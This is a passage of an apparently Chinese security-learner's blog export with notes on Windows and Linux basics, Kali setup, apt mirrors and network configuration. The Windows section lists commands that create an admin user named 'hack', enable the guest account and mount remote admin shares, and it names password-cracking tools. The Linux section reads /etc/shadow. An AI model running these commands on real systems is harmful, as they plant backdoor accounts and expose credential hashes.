class="line">parser.add_option(<span class="string">"-f"</span>,<span class="string">"--file"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"filename[传递的参数]"</span>,help=<span class="string">"[帮助提示信息]"</span>)</span><br><span class="line">parser.add_option(<span class="string">"-i"</span>,<span class="string">"--ip"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"address[传递的参数]"</span>,help=<span class="string">"[帮助提示信息]"</span>)</span><br><span class="line">(options,args)=parser.parse_args()</span><br></pre></td></tr></table></figure><p>-f,-i,-h</p>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python脚本 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows基础</title>
      <link href="/categories/Windows/windows%E5%9F%BA%E7%A1%80/"/>
      <url>/categories/Windows/windows%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>win基础</p><a id="more"></a><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dxdiag</td><td>诊断工具</td></tr><tr><td>msconfig</td><td>系统配置（启动）</td></tr><tr><td>services.msc</td><td>服务</td></tr><tr><td>mstsc</td><td>远程桌面连接</td></tr><tr><td>gpedit.msc</td><td>本地组策略编辑器</td></tr><tr><td>regedit</td><td>注册表编辑器</td></tr><tr><td>ncpa.cpl</td><td>网络配置</td></tr><tr><td>notepad</td><td>记事本</td></tr><tr><td>control</td><td>控制面板</td></tr><tr><td>cmd</td><td>shell</td></tr><tr><td>calc</td><td>计算器</td></tr><tr><td>mmc</td><td>控制台</td></tr></tbody></table><h2 id="系统目录"><a href="#系统目录" class="headerlink" title="系统目录"></a>系统目录</h2><p>1.windows(系统安装目录)-&gt;System32(系统配置文件目录)-&gt;config-&gt;SAM  (pe)<br>2.Program Files/Program Files (x86)  (程序默认安装目录)<br>3.PerfLogs(日志)<br>4.用户-&gt;启动</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><table><thead><tr><th>服务</th><th>端口号</th></tr></thead><tbody><tr><td>http</td><td>80,8080,8090,3128,8081,9080…</td></tr><tr><td>ftp</td><td>21</td></tr><tr><td>telnet</td><td>23</td></tr><tr><td>tftp</td><td>69/udp</td></tr><tr><td>ssh</td><td>22/tcp</td></tr><tr><td>pop3</td><td>110/tcp</td></tr><tr><td>tomcat</td><td>8080</td></tr><tr><td>win2003远程登录</td><td>3389</td></tr><tr><td>orical</td><td>1521</td></tr><tr><td>mysql mssql</td><td>1433/tcp,1433/udp</td></tr><tr><td>qq</td><td>1080/udp</td></tr></tbody></table><blockquote><p>通过端口可以 信息搜集，目标探测，服务判断，系统判断，系统角色分析</p></blockquote><h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>工具：U盘破解（sam）pe,lc5,彩虹表，hydra</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>win+e：计算机<br>ctrl+shift+esc:任务管理器<br>win+tab:3D桌面</p><h2 id="手动清除木马"><a href="#手动清除木马" class="headerlink" title="手动清除木马"></a>手动清除木马</h2><p>开机启动项：% Run<br>查询服务： services.msc<br>网络端口： netstat -o (-anp)</p><h2 id="dos命令"><a href="#dos命令" class="headerlink" title="dos命令"></a>dos命令</h2><p><code>cmd</code>:</p><p>color a //cmd绿字黑底</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all </span><br><span class="line">ipconfig &#x2F;release</span><br><span class="line">ipconfig &#x2F;renew</span><br><span class="line">systeminfo 系统配置 (补丁)</span><br></pre></td></tr></table></figure><p>arp -a</p><p>net view</p><p>shutdown -s -t 180 -c “hack”</p><p>shutdown -a</p><p>cls    //清屏</p><p>md seven    //创建文件夹</p><p>rd seven    //删除文件夹</p><p>copy con c:/seven.txt    //创建文件</p><p>hello seven</p><p>Ctrl+z</p><p>type seven.txt    //查看文件内容</p><p>start seven.txt    //打开文件查看内容</p><p>start <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>    //打开网页</p><p>del seven.txt    //删除文件</p><p>tree    //文件目录树形输出</p><p>copy 文件 位置<br>例 copy 1.txt c:\windows</p><p>ren //重命名</p><p>net start    //服务<br>net stop telnet<br>net start telnet</p><p>net user<br>net user hack 12314dsf /add<br>net user localgroup administrators hack /add<br>net user hack /del<br>net user guest /active:yes<br>net user guest 123345</p><p>net password 123456    //更改系统登录密码</p><p>net share    //查看本地开启的共享<br>net share k: ipc$<br>net share ipc$ /del<br>net share c$ /del</p><p>net use k: \ip\c$<br>net use k: \192.168.1.122\c$    //拽共享盘</p><p>netstat /?<br>schtasks /?</p>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali ssh连接</title>
      <link href="/categories/Linux/Kali-Linux/kali%20ssh%E8%BF%9E%E6%8E%A5/"/>
      <url>/categories/Linux/Kali-Linux/kali%20ssh%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p><a id="more"></a><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd.conf  #ssh配置文件</span><br><span class="line">PasswordAuthentication yes#允许密码链接</span><br><span class="line">PubkeyAuthentication yes#允许秘钥登录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh status #查看状态</span><br><span class="line">/etc/init.d/ssh start #开启ssh</span><br><span class="line">/etc/init.d/ssh restart #重启ssh</span><br><span class="line">update-rc.d ssh enable #打开开机自启</span><br><span class="line">update-rc.d ssh disabled #关闭开机自启</span><br></pre></td></tr></table></figure><h3 id="服务器免密互联"><a href="#服务器免密互联" class="headerlink" title="服务器免密互联"></a>服务器免密互联</h3><p>修改hosts</p><p>修改hostname</p><p>可以通过hostname登录</p><p>ssh-keygen</p><p>生成秘钥，上传秘钥</p><p>修改sshd.config,开启秘钥登录</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>镜像源更新</title>
      <link href="/categories/Linux/%E9%95%9C%E5%83%8F%E6%BA%90%E6%9B%B4%E6%96%B0/"/>
      <url>/categories/Linux/%E9%95%9C%E5%83%8F%E6%BA%90%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<p>kali源：用于kali更新，也可在ubunto和debian上安装kali工具</p><a id="more"></a><h2 id="ubuntu更新源"><a href="#ubuntu更新源" class="headerlink" title="ubuntu更新源"></a>ubuntu更新源</h2><p><a href="https://mirrors.tuna.tsinghua.edu.cn/" target="_blank" rel="noopener">清华大学开源软件镜像站</a></p><p><img src="1589423609991.png" alt="1589423609991"></p><p>点击问号</p><p><img src="1589423652704.png" alt="1589423652704"></p><p>选择版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><ul><li>相关命令</li></ul><p>sudo apt-get update  更新源</p><p>sudo apt-get install package 安装包</p><p>sudo apt-get remove package 删除包</p><p>sudo apt-cache search package 搜索软件包</p><p>sudo apt-cache show package  获取包的相关信息，如说明、大小、版本等</p><p>sudo apt-get install package –reinstall   重新安装包</p><p>sudo apt-get -f install   修复安装</p><p>sudo apt-get remove package –purge 删除包，包括配置文件等</p><p>sudo apt-get build-dep package 安装相关的编译环境</p><p>sudo apt-get upgrade 更新已安装的包</p><p>sudo apt-get dist-upgrade 升级系统</p><p>sudo apt-cache depends package 了解使用该包依赖那些包</p><p>sudo apt-cache rdepends package 查看该包被哪些包依赖</p><p>sudo apt-get source package  下载该包的源代码</p><p>sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包</p><p>sudo apt-get check 检查是否有损坏的依赖</p><h2 id="kali更新源"><a href="#kali更新源" class="headerlink" title="kali更新源"></a>kali更新源</h2><p>升级补丁,保持系统最新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list <span class="comment">#修改 更新源 文件</span></span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line"> </span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update <span class="comment">#更新索引</span></span><br><span class="line">apt-get upgrade <span class="comment">#根据索引，真正更新</span></span><br></pre></td></tr></table></figure><p>在ubuntu,debian上更换源后，更新索引需要添加秘钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali之网络配置</title>
      <link href="/categories/Linux/Kali-Linux/kali%E4%B9%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/"/>
      <url>/categories/Linux/Kali-Linux/kali%E4%B9%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>基础配置</p><a id="more"></a><p><strong>网络配置</strong></p><p>临时ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 <span class="comment">#查询eth0网卡配置</span></span><br><span class="line"></span><br><span class="line">dhclient eth0 <span class="comment">#向DHCP服务器发送请求自动获得IP地址 ，执行此步需要网卡配置为动态获取（dhcp）</span></span><br><span class="line"> </span><br><span class="line">ifconfig eth0 192.168.1.10/24 <span class="comment">#指定获得ip地址</span></span><br><span class="line"></span><br><span class="line">route add default gw 192.168.1.1 <span class="comment">#指定网关</span></span><br><span class="line"></span><br><span class="line">netstat -nr <span class="comment">#查询网关 </span></span><br><span class="line">route -n</span><br></pre></td></tr></table></figure><p>添加路由,内部网段（网络地址，不是主机地址/32），网关，网卡 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add -net 192.168.0.0&#x2F;24 gw 192.168.1.100 eth0</span><br></pre></td></tr></table></figure><p>配置DNS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim etc/resolv.conf</span><br><span class="line">namaserver 8.8.8.8</span><br><span class="line">namaserver 114.114.114.114</span><br><span class="line">或</span><br><span class="line"><span class="built_in">echo</span> nameserver 192.168.1.1 &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure><blockquote><p>这些ifconfig分配的IP和DNS在修改后从开机又会返回原值<br>因此可在静态模式下，制定自己的网卡</p></blockquote><p>网卡配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nerwork/interfaces</span><br></pre></td></tr></table></figure><p>默认为动态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure><p>静态为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The loopback network interface</span></span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line"></span><br><span class="line">address 172.28.34.88 <span class="comment">#ip</span></span><br><span class="line">netmask 255.255.255.192 <span class="comment">#子网掩码</span></span><br><span class="line">gateway 172.28.34.126 <span class="comment">#网关</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以下也可写在该网卡配置文件中</span></span><br><span class="line">dns-namaservers 192.168.0.10 192.168.0.20 <span class="comment">#dns服务器开机自动添加到dns文件内</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1 #开机添加路由配置</span></span><br><span class="line"><span class="comment">#down route del -net 172.168.0.0/24 #关机删除掉路由配置</span></span><br><span class="line"><span class="comment">#下面这两个可以不设置</span></span><br><span class="line"><span class="comment">#network 192.168.20.0 #网络地址</span></span><br><span class="line"><span class="comment">#broadcast 192.168.20.255 #广播地址</span></span><br></pre></td></tr></table></figure><blockquote><p>在虚拟机里，切换到桥接网卡，这个网卡静态配置即可生效</p><p><code>sudo /etc/init.d/networking restart</code> 配置完静态重启一下网络服务</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux基础</title>
      <link href="/categories/Linux/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/categories/Linux/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>linux基础知识</p><a id="more"></a><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><code>bin</code>  放普通用户也可以使用的命令<br><code>sbin</code>  放管理员才可以执行的命令<br><code>boot</code>  放启动(引导)配置文件<br><code>dev</code>  放存储设备的，例硬盘<br><code>etc</code>  放系统和应用程序的配置文件<br><code>home</code>  普通用户家目录<br><code>lib</code>  放函数库文件<br><code>lib64</code>  放64位函数库文件<br><code>live-build</code>  build自己kali版本<br><code>lost found</code>  出现问题，错误，丢失的文件目录<br><code>media mnt</code>  挂载外来存储介质<br><code>opt</code>  安装外围的大型程序的<br><code>proc</code>  开机生成的配置文件<br><code>root</code>  主目录<br><code>selinux</code>  linux的安全机制<br><code>srv sys tmp</code>  临时目录<br><code>usr</code>  也可安装外围程序<br><code>var</code>  存放经常变化的如日志，邮件的目录</p><h2 id="求助命令"><a href="#求助命令" class="headerlink" title="求助命令"></a>求助命令</h2><h3 id="指令的-–help-求助说明"><a href="#指令的-–help-求助说明" class="headerlink" title="指令的 –help 求助说明"></a>指令的 –help 求助说明</h3><p>几乎linux上指令，在开发的时候，就被开发者将指令的语法与参数写入指令的操作过程中了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls --help</span><br></pre></td></tr></table></figure><p>只能用来查询指令，一般用来做协助查询</p><h3 id="man-page"><a href="#man-page" class="headerlink" title="man page"></a>man page</h3><p>man 是 manual(操作说明)的简写；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man ls</span><br></pre></td></tr></table></figure><p>左上角的【ls(1)】(1)解释如下:</p><table><thead><tr><th>代号</th><th>代表内容</th></tr></thead><tbody><tr><td>1</td><td>用户在shell环境中可以操作的指令或可执行文件</td></tr><tr><td>…</td><td>…</td></tr><tr><td>5</td><td>配置文件或者是某些文件的格式</td></tr><tr><td>…</td><td>…</td></tr><tr><td>8</td><td>系统管理员可使用的管理命令</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p>man page内大致内容如下(前四个重要)</p><table><thead><tr><th>代号</th><th>内容</th></tr></thead><tbody><tr><td>NAME</td><td>简短的指令，数据名称说明</td></tr><tr><td>SYNOPSIS</td><td>简短的指令下达语法</td></tr><tr><td>DESCRIPTION</td><td>较为完整的说明</td></tr><tr><td>OPTIONS</td><td>针对SYNOPSIS 中，列举出所有可用的选项的说明</td></tr></tbody></table><p>man page 常用按键：</p><table><thead><tr><th>按键</th><th>反应</th></tr></thead><tbody><tr><td>空格键</td><td>向下翻一页</td></tr><tr><td>[Page Down]</td><td>向下翻一页</td></tr><tr><td>[Page Up]</td><td>向上翻一页</td></tr><tr><td>[Home]</td><td>去到第一页</td></tr><tr><td>[End]</td><td>去到最后一页</td></tr><tr><td>/关键字</td><td>向下搜索</td></tr><tr><td>?关键字</td><td>向上搜索</td></tr><tr><td>n,N</td><td>在 ？和 / 的基础上   n向下一个搜索，N反向搜索</td></tr><tr><td>q</td><td>退出</td></tr></tbody></table><p><strong>搜索特定的指令/文件的man page说明文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man -f man#等同 whatis [指令或是数据]（只能root用户使用）</span><br><span class="line">man 1 man</span><br><span class="line">man 7 man</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man -k man  #搜列出所有含有关键字的说明文件，相当于 apropos [指令或是数据] (root用户)</span><br></pre></td></tr></table></figure><h3 id="info-page（kali无info）"><a href="#info-page（kali无info）" class="headerlink" title="info page（kali无info）"></a>info page（kali无info）</h3><p>查询指令和文件的格式，与 man 相似，但是拆分为不同的节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info info</span><br></pre></td></tr></table></figure><h3 id="非联网的说明文件"><a href="#非联网的说明文件" class="headerlink" title="非联网的说明文件"></a>非联网的说明文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/doc</span><br></pre></td></tr></table></figure><h2 id="熟悉命令"><a href="#熟悉命令" class="headerlink" title="熟悉命令"></a>熟悉命令</h2><blockquote><p>命令字 [选项] [参数]<br>linux 命令：用于实现某一功能的指令或程序，执行依赖于解释器程序，（/bin/bash）<br>man 指令 #查询指令用法<br>指令 –help #查询指令选项</p></blockquote><p><code>uname</code><br>uname -r    //系统内核<br>uname -a    //系统详细信息<br>which uname    //查看位置</p><p><code>hostnema</code><br>hostname    //主机名</p><p><code>mkdir</code><br>创建目录<br>-p 递归创建</p><p><code>touch</code><br>创建文件</p><p><code>ls</code><br>浏览目录<br>-l 长格式显示文件名，d-目录，-普通文件，c-字符型设备，l-链接文件，b-块设备（sda）f-堆栈文件，p-命令管道。<br>s、p：这些文件关系到系统的数据结构和管道(pipe)，通常很少见到。</p><p>drwxr-xr-x<br>第一个字符后面有三个字符组，分别表示文件拥有者，文件用户组，系统其他用户。<br>-a 多显示出以.命名的隐藏文件<br>-h 显示大小，（3M)<br>-R 递归浏览</p><p>–fulll-time 完整时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lh --sort=size # 以文件大小排序,size可换为time,按时间排</span><br></pre></td></tr></table></figure><p><code>cd</code><br>进入目录<br>. 当前目录<br>.. 这个目录的上个目录</p><p><code>ln</code><br>为文件或目录建立链接（link）<br>-s 建立软链接文件（省略此项则显示硬链接）</p><p><code>cp</code><br>复制<br>-r 递归复制整个目录树<br>-p 保持源文件的属性不变<br>-f 强制覆盖目录目标同名文件或目录<br>-i 需要覆盖文件或目录时进行提醒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ps ps1 # 拷贝ps 命名为ps1</span><br></pre></td></tr></table></figure><p><code>rm</code><br>-f 强行删除文件或目录，不进行提醒<br>-i 删除文件或目录时提醒用户确定<br>-r 递归删除整个目录树</p><p><code>mv</code><br>移动</p><p><code>pwd</code><br>查看当前的工作目录</p><p><code>cat</code><br>查看文本文件内容，全部显示<br>which cat<br>cat /etc/passwd<br>cat /etc/shadow<br>-n 显示行号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date &gt; 1</span><br><span class="line">cat 1 2</span><br><span class="line">cat 1 2 &gt; 3  //合并</span><br></pre></td></tr></table></figure><p><code>more</code><br>按百分比显示文本内容，逐屏显示，enter:查看下一页， q: 退出</p><p><code>less</code><br>不显示百分比，和more 类似，显示目录位置,q退出</p><p><code>tail</code><br>默认显示最后10行<br>-20 显示最后20行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 2 tail -20 /var/log/messages # 每隔两秒显示查看日志变化最后20行（实时查看系统日志变化）有的发行版没有messages这个文件。</span><br></pre></td></tr></table></figure><p><code>du</code><br>统计目录及文件的空间占用情况</p><p><code>wc</code><br>统计文件中行数，单词数量，字符数<br>-l 行数<br>-w 单词数<br>-c 字符数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wc 1.txt 会出现2 4 26</span><br><span class="line">2是行数，4是单词数，26是字符数</span><br></pre></td></tr></table></figure><p><code>find</code><br>查找<br>find [查找范围] [查找条件]<br>-name 按文件名称查找<br>-size 按大小查找<br>-user 按文件属主查找<br>-type 按文件类型查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -name "resol*.conf"</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -iname namp #从/查找不分大小写的namp</span><br><span class="line">find . -name "ps*" -exec cp &#123;&#125; /tmp//&#123;&#125;.bak \: #从本目录下搜索ps开头的文件，并拷贝到目标目录</span><br></pre></td></tr></table></figure><p><strong>-iname: 不分大小写， -name: 分大小写</strong></p><p><code>whereis</code><br>查找</p><p><strong>如果是源码安装，不是本地包管理安装，会查找不到</strong><br><strong>如果在whereis的数据库里（本地安装回生成一个whereis数据库），比find快</strong><br><strong>updatedb 更新数据库</strong><br><strong>-b 二进制文件</strong></p><p><code>top</code><br>监视系统性能参数</p><p>q退出，输入k 结束某进程</p><p><code>ps</code><br>显示进程<br>-ef 详细显示<br>aus 显示的列信息稍有不同</p><p><code>grep</code><br>筛选显示的内容<br>配角：<code>cat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd # 查看操作系统的本地账号</span><br><span class="line">grep ssh /etc/passwd #只显示包含ssh的内容</span><br></pre></td></tr></table></figure><p><code>awk</code></p><p>指定列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> <span class="comment">#获取第一列</span></span><br><span class="line">awk <span class="string">'&#123;print $1, $2, $3&#125;'</span> <span class="comment">#获取第一列，第二列，第三列</span></span><br><span class="line">awk <span class="string">'NR==1&#123;print $1, $2, $3&#125;'</span> <span class="comment">#获取第一行的第一列，第二列，第三列</span></span><br><span class="line">awk <span class="string">'END&#123;print NR&#125;'</span> <span class="comment">#获取行数NR</span></span><br><span class="line">awk <span class="string">'END&#123;print NF&#125;'</span> <span class="comment">#获取列数NF（这里是获取最后一行的列数，注意每行的列数可能是不同的）</span></span><br><span class="line">awk <span class="string">'&#123;print $NF&#125;'</span> <span class="comment">#获取最后一列</span></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> fileName <span class="comment">#对文件进行操作</span></span><br><span class="line">awk  -F<span class="string">':'</span> <span class="string">'&#123;print $1&#125;'</span> <span class="comment">#指定分隔符（这里以:分割）</span></span><br><span class="line">awk <span class="string">'&#123;print $100&#125;'</span> <span class="comment">#超出范围不报错</span></span><br></pre></td></tr></table></figure><p><code>sed</code></p><p>指定行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -n 2p <span class="comment">#指定第一行(sed -n 指定行数)</span></span><br><span class="line">sed -n 1,10p <span class="comment">#第一至十行</span></span><br><span class="line">sed -n 1,100p <span class="comment">#超出范围不报错，第一行是1不能是0，否则报错</span></span><br></pre></td></tr></table></figure><p><code>ifconfig</code><br>配角：<code>maccharger</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 